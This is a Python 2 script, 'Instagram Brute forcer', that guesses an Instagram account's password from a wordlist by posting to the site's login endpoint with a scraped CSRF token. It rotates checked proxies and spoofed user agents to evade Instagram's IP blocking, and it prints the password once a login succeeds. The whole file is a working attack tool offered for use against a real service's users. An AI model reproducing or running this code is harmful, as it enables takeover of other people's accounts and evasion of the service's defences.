# coding=utf-8
###############################################################################
# Instagram Brute forcer
# Developed By N3TC@T
# netcat[dot]av[at]gmail[dot]com 
# !/usr/bin/python
###############################################################################

import Queue
import random
import sys
import threading

import requests as rq


def check_proxy(q):
    """
    check proxy for and append to working proxies
    :param proxy:
    """
    if not q.empty():
        proxy = q.get(False)
        proxy = proxy.replace("\r", "").replace("\n", "")
        try:
            r = rq.get("https://api.ipify.org/", proxies={'https': 'https://' + proxy}, timeout=5)
            if r.status_code == 200:
                proxy_ip, sp, port = proxy.rpartition(':')
                if proxy_ip == r.text:
                    proxys_working_list.update({proxy: proxy})
                    print " --[+] ", proxy, " | PASS"
                else:
                    print " --[!] ", proxy, " | FAILED"
            else:
                print " --[!] ", proxy, " | FAILED"
        except rq.exceptions.RequestException:
            pass


def get_csrf():
    """
    get CSRF token from login page to use in POST requests
    """
    global csrf_token

    print "[+] Getting CSRF Token: "
    url = 'https://www.instagram.com/'
    r = rq.get(url)
    csrf_token = r.cookies['csrftoken']
    print "[+] CSRF Token :", csrf_token, "\n"


def brute(q):
    """
    main worker function
    :param word:
    :param event:
    :return:
    """
    if not q.empty():
        global proxy_string
        try:
            proxy = None
            if len(proxys_working_list) != 0:
                proxy = random.choice(proxys_working_list.keys())
                proxy_string = {'https': 'https://' + proxy}

            word = q.get()
            word = word.replace("\r", "").replace("\n", "")
            post_data = {
                'username': USER,
                'password': word,
            }
            header = {
                "User-Agent": random.choice(user_agents),
                'X-Instagram-AJAX': '1',
                "X-CSRFToken": csrf_token,
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
            }
            cookies = {
                "csrftoken": csrf_token
            }

            if proxy:
                print "[*] Trying %s %s " % (word, " | " + proxy,)
                r = rq.post(URL, headers=header, data=post_data, cookies=cookies, proxies=proxy_string, timeout=10)
            else:
                print "[*] Trying %s" % (word,)
                r = rq.post(URL, headers=header, data=post_data, cookies=cookies, timeout=10)

            if r.status_code != 200:
                if r.status_code == 400 or r.status_code == 403:
                    if proxy:
                        print "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (
                            proxy,)
                        proxys_working_list.pop(proxy)
                        print "\n[+] Online Proxy: ", len(proxys_working_list)
                    else:
                        print "[!]Error : Your Ip is now on Instagram jail , script will not work fine until you change your ip or use proxy"
                else:
                    print "Error:", r.status_code

                q.task_done()
                return
            else:
                if r.text.find('{"status": "ok", "authenticated": true, "user": "' + USER + '"}') != -1:
                    print "\n[*]Successful Login:"
                    print "---------------------------------------------------"
                    print "[!]Username: ", USER
                    print "[!]Password: ", word
                    print "---------------------------------------------------\n"
                    found_flag = True
                    q.queue.clear()
                    q.task_done()

        except Exception as e:
            print "[!] Error in request"
            pass
            return


def starter():
    """
    threading workers initialize
    """
    global found_flag

    queue = Queue.Queue()
    threads = []
    max_thread = THREAD
    found_flag = False

    queuelock = threading.Lock()

    print "\n[!] Initializing Workers"
    print "[!] Start Cracking ... \n"

    try:
        for word in words:
            queue.put(word)
        while not queue.empty():
            queuelock.acquire()
            for workers in range(max_thread):
                t = threading.Thread(target=brute, args=(queue,))
                t.setDaemon(True)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            queuelock.release()
            if found_flag:
                break
        print "\n--------------------"
        print "[!] Brute complete !"

    except Exception as err:
        print err


def check_avalaible_proxys(proxys):
    """
        check avalaible proxyies from proxy_list file
    """
    global proxys_working_list
    print "\n[-] Testing Proxy List..."

    proxys_working_list = {}

    queue = Queue.Queue()
    queuelock = threading.Lock()
    threads = []

    for proxy in proxys:
        queue.put(proxy)

    while not queue.empty():
        queuelock.acquire()
        for workers in range(7):
            t = threading.Thread(target=check_proxy, args=(queue,))
            t.setDaemon(True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        queuelock.release()

    print "\n[+] Online Proxy: ", len(proxys_working_list)


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print "\nUsage : ./instabrute.py <username> <wordlist> <proxylist> <thread>"
        print "Eg: ./instabrute.py netcat words.txt proxy.txt 4\n"
        sys.exit(1)

    URL = "https://www.instagram.com/accounts/login/ajax/"
    USER = sys.argv[1]
    PROXY = sys.argv[3]
    THREAD = int(sys.argv[4])

    user_agents = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
                   'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
                   'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
                   'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
                   'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
                   'Microsoft Internet Explorer/4.0b1 (Windows 95)',
                   'Opera/8.00 (Windows NT 5.1; U; en)',
                   'amaya/9.51 libwww/5.4.0',
                   'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
                   'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
                   'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
                   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
                   'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
                   'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]'
                   ]

    try:
        words = open(sys.argv[2]).readlines()
    except IOError:
        print "[-] Error: Check your word list file path\n"
        sys.exit(1)

    try:
        proxys = open(sys.argv[3]).readlines()
    except IOError:
        print "[-] Error: Check your proxy list file path\n"
        sys.exit(1)

    print "\n***************************************"
    print "* Inastgarm Brute forcer              *"
    print "* Coded by N3TC@T                     *"
    print "* netcat[dot]av[at]gmail[dot]com      *"
    print "***************************************"
    print "[+] Username Loaded:", USER
    print "[+] Words Loaded:", len(words)
    print "[+] Proxy Loaded:", len(proxys)

    check_avalaible_proxys(proxys)
    get_csrf()
    starter()
